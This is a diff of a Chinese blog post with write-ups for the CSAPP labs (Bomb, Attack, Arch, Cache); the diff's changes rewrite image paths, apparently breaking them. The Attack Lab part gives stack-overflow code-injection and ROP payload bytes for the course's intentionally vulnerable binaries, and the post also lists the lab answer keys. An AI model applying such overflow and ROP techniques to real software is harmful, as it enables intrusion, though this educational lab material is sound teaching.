@@ -152,21 +152,21 @@ var _hmt = _hmt || [];
 </ul>
 <h3 id="1-phases-1">1) phases_1</h3>
 <p>单步进入<code>phase_1</code>函数。程序会通过<code>string_no_equal</code>函数判断输入的字符串是否与特定字符串相等，如果不相等则炸弹爆炸。</p>
-<img src="/2020/07/csapp-lab-writeup/bomblab_phases_1.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_1.png" class>
 <p>由此可得出<code>phases1</code>为<code>Border relations with Canada have never been better.</code>(勿漏句末<em>点号</em>)</p>
 <h3 id="2-phases-2">2) phases_2</h3>
 <p><code>phases_2</code>函数中，首先会调用<code>read_six_numbers</code>函数，从刚刚的一行输入中读取6个数字, 并判断<code>a == 1 ?</code>，</p>
-<img src="/2020/07/csapp-lab-writeup/bomblab_phases_2_1.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_2_1.png" class>
 <blockquote>
 <p>为了简化说明，我们将输入的6个数分别取名为<strong>a, b, c, d, e, f</strong>。<br>
 将<strong>a是否等于b</strong>命名为<code>a = b ?</code></p>
 </blockquote>
 <p>之后循环判断  <strong>2 * 当前遍历到的数 == 下一个遍历到的数 ?</strong></p>
-<img src="/2020/07/csapp-lab-writeup/bomblab_phases_2_2.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_2_2.png" class>
 <p>即判断输入的6个数是否是<strong>以2为公比的非零等比数列</strong>，如果所有条件都满足则通过此关卡。由此可得出<code>phases2</code>可以是<code>1 2 4 8 16 32</code></p>
 <h3 id="3-phases-3">3) phases_3</h3>
 <p><code>phases_3</code>函数中，程序会先将读入的一行字符串转化为两个数字（如果转换的数字个数不为2则爆炸）然后判断第一个数<code>a &lt; 7 ?</code>。第二个数的值取决于第一个数。如果第二个数与第一个数所指定的常数相等，则通过此关卡。</p>
-<img src="/2020/07/csapp-lab-writeup/bomblab_phases_3.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_3.png" class>
 <p>由此我们可以得到<code>phases3</code>： <code>7 327</code>（答案不唯一）</p>
 <h3 id="4-phases-4">4) phases_4</h3>
 <p><code>phases_4</code>函数与<code>phases_3</code>函数类似，都会读入两个数字。该函数会执行以下流程</p>
@@ -175,7 +175,7 @@ var _hmt = _hmt || [];
 <li>执行函数<code>func4(a, 0, 14)</code>，并判断其返回值是否等于0</li>
 <li>判断输入的第二个数<code>b</code>是否等于0</li>
 </ul>
-<img src="/2020/07/csapp-lab-writeup/bomblab_phases_4.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_4.png" class>
 <p><code>func4</code>函数比较特殊，该函数会在内部递归调用自身。通过分析其反汇编代码，得到以下C代码</p>
   <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> arg0, <span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tmp1 = arg2 - arg1;</span><br><span class="line">    <span class="comment">// 逻辑右移获取符号位</span></span><br><span class="line">    <span class="keyword">int</span> tmp2 = (tmp1 &gt;&gt; <span class="number">31</span>) + tmp1;</span><br><span class="line">    tmp2 &gt;&gt;= <span class="number">1</span>; <span class="comment">// 算术右移</span></span><br><span class="line">    <span class="keyword">int</span> tmp3 = tmp2 + arg1;</span><br><span class="line">    <span class="keyword">if</span> (tmp3 &lt;= arg0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp3 &gt;= arg0) <span class="comment">// 实际上这里就是tmp3 == arg0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * func4(arg0, tmp3 + <span class="number">1</span>, arg2) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(arg0, arg1, tmp3 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>通过暴力枚举，可以得到<code>func(x, 0, 14) == 0</code>的4个解，分别为0, 1, 3, 7。<br>
@@ -186,7 +186,7 @@ var _hmt = _hmt || [];
 <li>判断读入的字符串长度是否等于6</li>
 <li>循环6次，以<code>ch &amp; 0xf</code>为索引，每次在全局字符串<strong>maduiersnfotvbyl</strong>中获取一个字符</li>
 </ol>
-  <img src="/2020/07/csapp-lab-writeup/bomblab_phases_5.png" class="">
+  <img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_5.png" class>
 <ol start="3">
 <li>待6次循环结束后，将选出的字符串与字符串<code>flyers</code>相比较，如果相同，则通过当前关卡</li>
 </ol>
@@ -196,14 +196,14 @@ var _hmt = _hmt || [];
 <ul>
 <li>
 <p>第一部分是一个嵌套循环。</p>
-<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_1.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_6_1.png" class>
 <p>为便于理解，将该嵌套循环的汇编代码翻译为如下C代码：</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6个输入的数字</span></span><br><span class="line"><span class="keyword">int</span> inputNum[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">int</span>* r13d = inputNum;</span><br><span class="line"><span class="keyword">int</span> r12d = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span>* rbp = r13d;</span><br><span class="line">  <span class="comment">// 所输入的数必须大于1，小于6</span></span><br><span class="line">  <span class="keyword">if</span>(*rbp - <span class="number">1</span> &lt;= <span class="number">5</span>) <span class="comment">// 无符号比较</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果遍历完成，则跳出循环</span></span><br><span class="line">    <span class="keyword">if</span>(++r12d == <span class="number">6</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">int</span> ebx = r12d;</span><br><span class="line">    <span class="comment">// 循环检测字符是否相等</span></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(inputNum[ebx] == rbp)</span><br><span class="line">        explode_bomb();</span><br><span class="line">      ebx++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(ebx &lt;= <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 指向下一个数组位置</span></span><br><span class="line">    r13d++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    explode_bomb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这个代码比较简单，因为它实际上就是遍历检测所输入的6个数是否出现重复，如果存在重复则爆炸。同时还将输入的数字限制在了1-6中(注意其中的数字是 <strong>无符号</strong> 整数)</p>
 </li>
 <li>
 <p>第二部分是一个简单的循环。这个循环将输入的六个数字设置为 <code>inputNum[i] = 7 - inputNum[i]</code></p>
-<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_2.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_6_2.png" class>
 </li>
 <li>
 <p>第三部分同样是一个循环，为便于说明，将该部分的汇编代码转换为如下的C代码：</p>
@@ -215,15 +215,15 @@ var _hmt = _hmt || [];
 </li>
 <li>
 <p>第四部分还是一个万年不变的循环。</p>
-<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_3.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_6_3.png" class>
 <p>这个循环会改变原来的链表顺序，并将其设置为栈上链表的顺序。其代码如下</p>
   <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rcx = <span class="built_in">list</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span>* rax = &amp;<span class="built_in">list</span>[<span class="number">1</span>]; rax != &amp;<span class="built_in">list</span>[<span class="number">5</span>]; rax++)</span><br><span class="line">&#123;</span><br><span class="line">  rcx-&gt;address = *rax;</span><br><span class="line">  rcx = *rax;</span><br><span class="line">&#125;</span><br><span class="line">rcx-&gt;address = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
 </li>
 <li>
 <p>第五部分是一个校验循环。这个循环会使用新顺序来获取链表上的值并判断其关系，其中链表上的值必须逐级递减，否则炸弹爆炸。</p>
-<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_4.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_6_4.png" class>
 <p>由于链表上的值顺序为 <strong>node3 &gt; node4 &gt; node5 &gt; node6 &gt; node1 &gt; node2</strong></p>
-<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_5.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/bomblab_phases_6_5.png" class>
 <p>故我们最后终于可以得出<code>phases6</code>: <code>4 3 2 1 6 5</code></p>
 </li>
 </ul>
@@ -232,21 +232,21 @@ var _hmt = _hmt || [];
 <li>
 <p>当6个关卡都通过之后，我们跟进<code>phase_defused</code>，发现还有隐藏关卡。<br>
 在进入隐藏关卡前，我们需要先通过两个判断。</p>
-<img src="/2020/07/csapp-lab-writeup/phases_defuse_1.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/phases_defuse_1.png" class>
 <p>将第一个判断的<code>sscanf</code>操作的字符串所在内存输出，可以看出，该字符串是<code>phases_4</code>关卡的输入<br>
 函数参数：</p>
-<img src="/2020/07/csapp-lab-writeup/phases_defuse_2.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/phases_defuse_2.png" class>
 <p>内部内存的值：</p>
-<img src="/2020/07/csapp-lab-writeup/phases_defuse_3.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/phases_defuse_3.png" class>
 <p>同时，第二个判断所对比的字符串为</p>
-<img src="/2020/07/csapp-lab-writeup/phases_defuse_4.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/phases_defuse_4.png" class>
 <p>故我们可以在<code>phases_4</code>关卡的输入后追加字符串<code>DrEvil</code>来进入隐藏关卡<code>secret_phase</code>。</p>
 </li>
 <li>
 <p><code>secret_phase</code>关卡中会先读入一个数字<code>inputNum</code>，并满足该条件<code>(inputNum - 1）&lt;= 0x3e8(1000)</code>, 即输入的数字必须小于等于1001。<br>
 之后执行函数<code>fun7(&amp;n1, inputNum)</code>。当该函数的返回值为2时则通过此关卡。<br>
 全局变量<code>n1</code>是一个树节点，其所有相关的树节点如下所示</p>
-<img src="/2020/07/csapp-lab-writeup/secret_phase_1.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/secret_phase_1.png" class>
 <p>为便于理解，将函数<code>fun7</code>的汇编代码转为C代码：</p>
   <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(treeNode* node, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(node == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(node-&gt;val &lt;= num)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(node-&gt;Val == num)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * fun7(node-&gt;right, num) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">2</span> * fun7(node-&gt;left, num);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>易知，若需<code>fun7(&amp;n1, inputNum) == 2</code>, 则要进行如下操作</p>
@@ -262,7 +262,7 @@ var _hmt = _hmt || [];
 <p>最后的输入文本为</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">7 327</span><br><span class="line">0 0 DrEvil</span><br><span class="line">ionefg</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">22</span><br></pre></td></tr></table></figure>
 <p>通关截图</p>
-<img src="/2020/07/csapp-lab-writeup/success.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/success.png" class>
 </li>
 </ul>
 <h2 id="3-Attack-Lab">3. Attack Lab</h2>
@@ -279,12 +279,12 @@ var _hmt = _hmt || [];
 </li>
 <li>
 <p>在<code>stable_stable_launch</code>函数中有个很有意思的操作。程序会mmap出一块RWX的内存，并将栈指针迁移到这块固定地址的内存上。这一步方便了后续的代码执行操作，否则原始栈上数据是不可执行的(NX)</p>
-<img src="/2020/07/csapp-lab-writeup/ctarget_1.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/ctarget_1.png" class>
 </li>
 <li>
 <p>代码注入脆弱点位于<code>getbuf</code>函数中，该函数会调用<code>gets</code>函数，这可能会造成溢出。<br>
 在该函数中，字符串所存入的地址为<code>0x5561dc78</code>，当前函数的返回地址存储于<code>0x5561dca0</code>，其相对偏移为<code>40</code></p>
-<img src="/2020/07/csapp-lab-writeup/ctarget_2.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/ctarget_2.png" class>
 </li>
 <li>
 <p><strong>phase1</strong></p>
@@ -303,7 +303,7 @@ var _hmt = _hmt || [];
 </blockquote>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
 <p>通过当前关卡的截图如下</p>
-<img src="/2020/07/csapp-lab-writeup/ctarget_touch1.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/ctarget_touch1.png" class>
 </li>
 </ul>
 </li>
@@ -312,7 +312,7 @@ var _hmt = _hmt || [];
 <ul>
 <li>
 <p><code>touch2</code>函数与<code>touch1</code>不太一样，它多了一项寄存器的比较。只有当<code>%edx == &lt;cookie&gt;</code>时才能通过当前关卡。</p>
-<img src="/2020/07/csapp-lab-writeup/ctarget_3.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/ctarget_3.png" class>
 </li>
 <li>
 <p>此时我们就需要在栈上布下代码，使控制流在<code>getBuf</code>函数返回时<strong>跳转至栈上的代码</strong>，<strong>修改%edx寄存器</strong>并最终<strong>跳转回<code>touch2</code>函数</strong>。这部分代码为</p>
@@ -322,13 +322,13 @@ var _hmt = _hmt || [];
   <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span> <span class="number">$0</span>x59b997fa, %rdi # <span class="number">0x59b997fa</span>是个人cookie</span><br><span class="line"><span class="keyword">push</span> <span class="number">$0</span>x4017ec</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
 <p>之后执行以下指令，将其编译为机器码并显示详细信息。</p>
   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c asm.s -o asm.o &amp;&amp; objdump -d asm.o</span><br></pre></td></tr></table></figure>
-<img src="/2020/07/csapp-lab-writeup/ctarget_asm_1.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/ctarget_asm_1.png" class>
 </li>
 <li>
 <p>最后我们的输入数据如下</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
 <p>通过当前关卡的截图如下</p>
-<img src="/2020/07/csapp-lab-writeup/ctarget_touch2.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/ctarget_touch2.png" class>
 </li>
 </ul>
 </li>
@@ -338,16 +338,16 @@ var _hmt = _hmt || [];
 <li>
 <p><code>touch3</code>函数与<code>touch2</code>函数类似，都存在着一个比较的判断，通过该判断即可通过当前关卡。<br>
 所不同的是，<code>touch3</code>函数中使用另一个函数<code>hexmatch</code>进行判断。<code>hexmatch</code>传入的参数分别为<code>&amp;cookie</code>与<code>touch3</code>的第一个参数<code>%rdi</code>。</p>
-<img src="/2020/07/csapp-lab-writeup/ctarget_3_2.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/ctarget_3_2.png" class>
 </li>
 <li>
 <p>分析<code>hexmatch</code>函数，可以发现，当栈溢出时刻的<code>%rdi == 0x5561dc13</code>时，即可通过当前关卡。</p>
-<img src="/2020/07/csapp-lab-writeup/ctarget_3_1.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/ctarget_3_1.png" class>
 </li>
 <li>
 <p>由于该关卡修改的寄存器与第二关的寄存器一致，所以可以直接修改第二关的输入数据，即可得到当前关卡的输入数据。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 13 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
-<img src="/2020/07/csapp-lab-writeup/ctarget_3_3.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/ctarget_3_3.png" class>
 </li>
 <li>
 <p><strong>注意!</strong> 这个解实际上是 <strong>非预期解</strong> 。按照正常的逻辑，用于存放cookie字符串的内存地址应该是随机的。</p>
@@ -362,7 +362,7 @@ var _hmt = _hmt || [];
 <li><code>rtarget</code>文件： 该文件用于ROP实验</li>
 <li>该文件使用了<strong>栈随机化(ASLR)</strong> 与 <strong>栈不可执行(NX)</strong> 这两项技术来防止代码注入攻击，所以我们要使用 <strong>ROP</strong> 攻击来完成特定目的。</li>
 <li><code>gets</code>输入点与函数返回地址存放位置之间的相对偏移仍是<code>40</code>。</li>
-<li>下面是一张汇编与机器表示相关的表格<img src="/2020/07/csapp-lab-writeup/attack_lab_ref.png" class="">
+<li>下面是一张汇编与机器表示相关的表格<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/attack_lab_ref.png" class>
 </li>
 <li><strong>phase4</strong>
 <ul>
@@ -383,7 +383,7 @@ var _hmt = _hmt || [];
 </li>
 <li>
 <p>上述的两条<code>popq rax</code>与<code>movq %rax, %rdi</code> 之间的配合，间接构成了一条<code>popq %rdi</code>指令，这样我们就可以设置寄存器<code>%rdi</code>，完成目的。实际效果如下：</p>
-<img src="/2020/07/csapp-lab-writeup/rtarget_2_1.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/rtarget_2_1.png" class>
 </li>
 </ul>
 </li>
@@ -397,7 +397,7 @@ var _hmt = _hmt || [];
 <p>最终输入的数据如下</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
 <p>过关截图</p>
-  <img src="/2020/07/csapp-lab-writeup/rtarget_2_2.png" class="">
+  <img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/rtarget_2_2.png" class>
 </li>
 </ul>
 </li>
@@ -410,7 +410,7 @@ var _hmt = _hmt || [];
   <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">401</span>a06: <span class="number">48</span> <span class="number">89</span> e0              movq %rsp, %rax</span><br><span class="line"><span class="number">401</span>a09: c3                    retq</span><br><span class="line"></span><br><span class="line"><span class="number">4019</span>d8: <span class="number">04</span> <span class="number">37</span>                 add <span class="number">0x37</span>, %al</span><br><span class="line"><span class="number">4019</span>da: c3                    retq</span><br><span class="line"></span><br><span class="line"><span class="number">4019</span>a2: <span class="number">48</span> <span class="number">89</span> c7              movq %rax, %rdi</span><br><span class="line"><span class="number">4019</span>a5: c3                    retq</span><br></pre></td></tr></table></figure>
 <p>这些gadgets组合起来，可以获得指定偏移量的栈地址。如果将cookie字符串写入至此地址上，则可以达到 <strong>%rdi指向cookie字符串</strong> 这个目的，这样便可以通过当前关卡。</p>
 <p>使用效果如下</p>
-  <img src="/2020/07/csapp-lab-writeup/rtaget_3_1.png" class="">
+  <img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/rtaget_3_1.png" class>
 </li>
 <li>
 <p>最后的输入数据如下</p>
@@ -419,7 +419,7 @@ var _hmt = _hmt || [];
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">d8 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
 <p>过关截图</p>
-  <img src="/2020/07/csapp-lab-writeup/rtarget_3_2.png" class="">
+  <img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/rtarget_3_2.png" class>
 </li>
 </ul>
 </li>
@@ -437,7 +437,7 @@ var _hmt = _hmt || [];
 <p>其中，编译与运行<code>Y86</code>指令的shell脚本如下</p>
   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">./yas $*.ys &amp;&amp; ./yis $*.yo</span><br></pre></td></tr></table></figure>
 <p>执行效果如图所示</p>
-  <img src="/2020/07/csapp-lab-writeup/y86_disp.png" class="">
+  <img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/y86_disp.png" class>
 </li>
 <li>
 <p><code>sum_list</code>函数的<code>Y86</code>汇编 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20A/sum.ys" target="_blank" rel="noopener">github</a></p>
@@ -469,7 +469,7 @@ var _hmt = _hmt || [];
 <p>当指令添加完成后，执行以下操作</p>
   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成新的SEQ模拟器。如果make失败，可能需要修改makefile</span></span><br><span class="line">make clean &amp;&amp; make VERSION=full</span><br><span class="line"><span class="comment"># 可选操作，使用一个简单的例子测试iaddq指令</span></span><br><span class="line">./ssim -t ../y86-code/asumi.yo</span><br><span class="line"><span class="comment"># 可选操作，如果需要debug，则可以使用GUI形式的ssim来单步调试</span></span><br><span class="line">./ssim -g ../y86-code/asumi.yo</span><br><span class="line"><span class="comment"># 可选操作，使用微型测试集来测试除iaddq指令以外的其他指令。</span></span><br><span class="line"><span class="comment"># 这部分的目的主要有两点</span></span><br><span class="line"><span class="comment">#   1. 判断测试工具是否正常运行</span></span><br><span class="line"><span class="comment">#   2. 判断原先指令是否被用户无意间破坏</span></span><br><span class="line">(<span class="built_in">cd</span> ../y86-code; make testssim)</span><br><span class="line"><span class="comment"># 可选操作，使用大量测试集来测试除iaddq指令以外的其他指令</span></span><br><span class="line">(<span class="built_in">cd</span> ../ptest; make SIM=../seq/ssim)</span><br><span class="line"><span class="comment"># 使用大量测试集来测试iaddq指令</span></span><br><span class="line">(<span class="built_in">cd</span> ../ptest; make SIM=../seq/ssim TFLAGS=-i)</span><br></pre></td></tr></table></figure>
 <p><code>iaddq</code>指令测试成功的截图如下</p>
-<img src="/2020/07/csapp-lab-writeup/seq_test.png" class="">
+<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/seq_test.png" class>
 </li>
 <li>
 <p>编译过程中可能会出现一些错误，例如未找到头文件<code>tk.h</code>、某个结构体中没有成员<code>result</code>、程序链接失败等等。其解决方法如下：</p>
@@ -550,7 +550,7 @@ var _hmt = _hmt || [];
 </ul>
 <h3 id="3-测试">3) 测试</h3>
 <ul>
-<li>使用<code>make &amp;&amp; ./driver.py</code>命令进行测试。以下是笔者的测试结果。<img src="/2020/07/csapp-lab-writeup/cache_lab_partB.png" class="">
+<li>使用<code>make &amp;&amp; ./driver.py</code>命令进行测试。以下是笔者的测试结果。<img src="/2020/07/csapp-lab-writeup/07/csapp-lab-writeup/cache_lab_partB.png" class>
 </li>
 </ul>
 <h2 id="6-Shell-Lab">6. Shell Lab</h2>
